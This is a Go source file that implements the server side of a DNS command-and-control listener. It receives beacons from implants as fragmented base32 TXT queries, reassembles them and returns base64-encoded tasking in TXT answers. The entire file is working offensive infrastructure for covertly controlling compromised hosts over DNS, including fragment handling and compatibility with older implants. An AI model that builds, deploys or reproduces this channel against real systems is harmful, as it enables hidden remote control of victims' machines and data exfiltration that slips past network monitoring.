package server

import (
	"bytes"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// DNS fragment assembly limits. A single DNS qname is capped at 253 text
// characters, so large beacon envelopes are split into multiple TXT queries;
// the listener reassembles them before handing the frame to the beacon handler.
const (
	// dnsFragMaxTotal caps the number of fragments per beacon envelope to
	// bound memory usage of the assembly buffer (64 fragments × ~64 bytes
	// ≈ 4 KiB per in-flight agent).
	dnsFragMaxTotal = 64
	// dnsFragTTL drops incomplete assemblies after 30s of inactivity.
	dnsFragTTL = 30 * time.Second
)

// dnsFragState holds partially-received fragments for one agent beacon.
type dnsFragState struct {
	total int
	parts map[int][]byte
	last  time.Time
}

// DNSBeaconListener runs a DNS C2 server on a configurable UDP port.
// It handles TXT-type DNS queries for agent beaconing and A-type queries for stub resolution.
type DNSBeaconListener struct {
	sync.RWMutex
	Domain  string // e.g. "c2.example.com"
	ID      uint   // listener DB ID
	Addr    string // e.g. ":53" or ":5353"
	server  *dns.Server
	handler func(string, []byte) []byte // fn(agentID, requestJSON) → responseJSON
	AgentIP string
	running bool

	fragMu  sync.Mutex
	frags   map[string]*dnsFragState // agentID → assembly
	stopGC  chan struct{}
	fstopMu sync.Mutex
}

// NewDNSBeaconListener creates a DNS C2 listener bound to addr (e.g. ":53").
func NewDNSBeaconListener(domain string, agentIP string, listenerID uint, addr string) *DNSBeaconListener {
	if addr == "" {
		addr = ":53"
	}
	return &DNSBeaconListener{
		Domain:  domain,
		ID:      listenerID,
		Addr:    addr,
		AgentIP: agentIP,
		frags:   make(map[string]*dnsFragState),
	}
}

// SetHandler sets the beacon processing callback
func (dl *DNSBeaconListener) SetHandler(fn func(string, []byte) []byte) {
	dl.handler = fn
}

// Start binds UDP :53 and serves DNS
func (dl *DNSBeaconListener) Start() error {
	dl.Lock()
	defer dl.Unlock()
	if dl.running {
		return nil
	}

	mux := dns.NewServeMux()
	mux.HandleFunc(".", dl.handleQuery)

	dl.server = &dns.Server{
		Addr:    dl.Addr,
		Net:     "udp",
		Handler: mux,
	}

	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", dl.Addr)
	go func() {
		dl.Lock()
		dl.running = true
		dl.Unlock()
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		if err := dl.server.ListenAndServe(); err != nil {
			slog.Error("DNS C2 listener failed", "error", err)
			dl.Lock()
			dl.running = false
			dl.Unlock()
		}
	}()
	dl.startFragGC()
	return nil
}

// startFragGC periodically drops fragment assemblies that never completed.
func (dl *DNSBeaconListener) startFragGC() {
	dl.fstopMu.Lock()
	if dl.stopGC != nil {
		dl.fstopMu.Unlock()
		return
	}
	stop := make(chan struct{})
	dl.stopGC = stop
	dl.fstopMu.Unlock()

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				cutoff := time.Now().Add(-dnsFragTTL)
				dl.fragMu.Lock()
				for id, st := range dl.frags {
					if st.last.Before(cutoff) {
						delete(dl.frags, id)
					}
				}
				dl.fragMu.Unlock()
			case <-stop:
				return
			}
		}
	}()
}

// Stop shuts down the DNS listener
func (dl *DNSBeaconListener) Stop() error {
	dl.fstopMu.Lock()
	if dl.stopGC != nil {
		close(dl.stopGC)
		dl.stopGC = nil
	}
	dl.fstopMu.Unlock()

	dl.Lock()
	defer dl.Unlock()
	if !dl.running || dl.server == nil {
		return nil
	}
	dl.running = false
	return dl.server.Shutdown()
}

// Close implements io.Closer for use with extraListeners map.
func (dl *DNSBeaconListener) Close() error {
	return dl.Stop()
}

// IsRunning returns whether the listener is active
func (dl *DNSBeaconListener) IsRunning() bool {
	dl.RLock()
	defer dl.RUnlock()
	return dl.running
}

// ── DNS Query Handler ──────────────────────────────────────────────────────────

func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		return
	}

	q := r.Question[0]
	qname := strings.TrimSuffix(q.Name, ".")

	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(dl.Domain)) {
		m := new(dns.Msg)
		m.SetReply(r)
		m.SetRcode(r, dns.RcodeRefused)
		w.WriteMsg(m)
		return
	}

	switch q.Qtype {
	case dns.TypeA:
		dl.handleAType(w, r)
	case dns.TypeTXT:
		dl.handleTXTType(w, r)
	default:
		m := new(dns.Msg)
		m.SetReply(r)
		w.WriteMsg(m)
	}
}

func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	ip := net.ParseIP(dl.AgentIP)
	if ip == nil {
		ip = net.ParseIP("127.0.0.1")
	}
	if ipv4 := ip.To4(); ipv4 != nil {
		rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, ipv4.String()))
		m.Answer = append(m.Answer, rr)
	}
	w.WriteMsg(m)
}

// handleTXTType processes beacon TXT queries.
// Query format (fragmented): <hex-uuid>.<total_index>.<base32frag>... .dns.<domain>
//
//	<hex-uuid>:  32 hex chars (UUID without dashes)
//	<total_index>: fragment metadata "<total>_<index>" (0-based)
//	<base32frag>: one fragment of the base32-encoded JSON beacon request
//	.dns.:       fixed tag separating agent data from the domain
//	<domain>:    the configured DNS domain
//
// Legacy queries without the metadata label are still accepted as a single
// (unfragmented) base32 payload for compatibility with older implants.
//
// Response TXT: base64-encoded beaconResponse JSON (split into 255-char chunks)
func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	qname := strings.TrimSuffix(r.Question[0].Name, ".")

	// Strip the domain suffix to get the agent prefix
	prefix := strings.ToLower(qname)
	domainLower := strings.ToLower(dl.Domain)
	idx := strings.LastIndex(prefix, ".dns."+domainLower)
	if idx < 0 {
		addTXTRecord(m, r.Question[0].Name, "")
		w.WriteMsg(m)
		return
	}

	// Get everything before ".dns."
	agentPart := prefix[:idx]
	if agentPart == "" {
		addTXTRecord(m, r.Question[0].Name, "")
		w.WriteMsg(m)
		return
	}

	labels := strings.Split(agentPart, ".")
	agentID := labels[0]
	if len(agentID) > 64 {
		agentID = agentID[:64]
	}

	// If there are additional labels after the UUID, they either carry a
	// fragment metadata label ("<total>_<index>") plus the fragment data,
	// or (legacy single-shot queries) base32-encoded data labels.
	var requestData []byte
	if len(labels) > 1 && isFragMetaLabel(labels[1]) {
		data, complete, ok := dl.collectFragment(agentID, labels[1], labels[2:])
		if !ok {
			m.SetRcode(r, dns.RcodeFormatError)
			w.WriteMsg(m)
			return
		}
		if !complete {
			// Still awaiting remaining fragments: acknowledge quietly with a
			// blank TXT so the agent keeps sending without a hard failure.
			addTXTRecord(m, r.Question[0].Name, "")
			w.WriteMsg(m)
			return
		}
		requestData = data
	} else if len(labels) > 1 {
		dataLabels := labels[1:]
		combined := ""
		for _, l := range dataLabels {
			combined += l
		}
		var decErr error
		requestData, decErr = decodeBase32NoPad(combined)
		if decErr != nil {
			requestData = nil
		}
	}

	dl.processBeacon(agentID, requestData, m, r)
	w.WriteMsg(m)
}

// isFragMetaLabel reports whether the label matches the "<total>_<index>"
// fragment metadata format used by the agent's DNS fragmenter.
func isFragMetaLabel(s string) bool {
	if len(s) < 3 || len(s) > 8 || !strings.Contains(s, "_") {
		return false
	}
	parts := strings.Split(s, "_")
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return false
	}
	for _, p := range parts {
		for _, c := range p {
			if c < '0' || c > '9' {
				return false
			}
		}
	}
	return true
}

// collectFragment buffers one fragment of an agent's DNS beacon envelope.
// It returns (assembledFrame, complete, true) once every fragment has
// arrived, (nil, false, true) while still collecting, and (nil, false,
// false) when the metadata or fragment payload is malformed.
func (dl *DNSBeaconListener) collectFragment(agentID, meta string, dataLabels []string) ([]byte, bool, bool) {
	parts := strings.SplitN(meta, "_", 2)
	total, err1 := strconv.Atoi(parts[0])
	idx, err2 := strconv.Atoi(parts[1])
	if err1 != nil || err2 != nil {
		return nil, false, false
	}
	if total < 1 || total > dnsFragMaxTotal || idx < 0 || idx >= total || len(dataLabels) == 0 {
		return nil, false, false
	}

	combined := strings.Join(dataLabels, "")
	frag, err := decodeBase32NoPad(combined)
	if err != nil || len(frag) == 0 {
		return nil, false, false
	}

	dl.fragMu.Lock()
	defer dl.fragMu.Unlock()

	st := dl.frags[agentID]
	if st == nil || st.total != total {
		st = &dnsFragState{total: total, parts: make(map[int][]byte, total)}
		dl.frags[agentID] = st
	}
	st.parts[idx] = frag
	st.last = time.Now()

	if len(st.parts) < total {
		return nil, false, true
	}
	var buf bytes.Buffer
	for i := 0; i < total; i++ {
		b, ok := st.parts[i]
		if !ok {
			// Cannot happen: len(parts) == total implies all indices present.
			delete(dl.frags, agentID)
			return nil, false, false
		}
		buf.Write(b)
	}
	delete(dl.frags, agentID)
	return buf.Bytes(), true, true
}

func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg) {
	if dl.handler == nil {
		addTXTRecord(m, r.Question[0].Name, "")
		return
	}

	// If the query carried embedded JSON data, use it; otherwise build a minimal request
	var reqJSON []byte
	if len(requestData) > 0 {
		reqJSON = requestData
	} else {
		reqMap := map[string]string{"uuid": agentID}
		var err error
		reqJSON, err = json.Marshal(reqMap)
		if err != nil {
			slog.Error("Failed to marshal DNS request", "agent", agentID, "err", err)
			addTXTRecord(m, r.Question[0].Name, "")
			return
		}
	}

	respJSON := dl.handler(agentID, reqJSON)
	encoded := base64.StdEncoding.EncodeToString(respJSON)
	addTXTRecord(m, r.Question[0].Name, encoded)
}

func addTXTRecord(m *dns.Msg, name string, value string) {
	if value == "" {
		value = " "
	}
	for i := 0; i < len(value); i += DNSTXTChunkSize {
		end := i + DNSTXTChunkSize
		if end > len(value) {
			end = len(value)
		}
		chunk := value[i:end]
		rr, err := dns.NewRR(fmt.Sprintf("%s TXT \"%s\"", name, chunk))
		if err != nil {
			slog.Error("DNS NewRR failed", "err", err)
			continue
		}
		m.Answer = append(m.Answer, rr)
	}
}

// decodeBase32NoPad decodes base32 without padding characters
func decodeBase32NoPad(s string) ([]byte, error) {
	s = strings.ToUpper(s)
	pad := 8 - (len(s) % 8)
	if pad < 8 {
		s += strings.Repeat("=", pad)
	}
	return base32.StdEncoding.DecodeString(s)
}
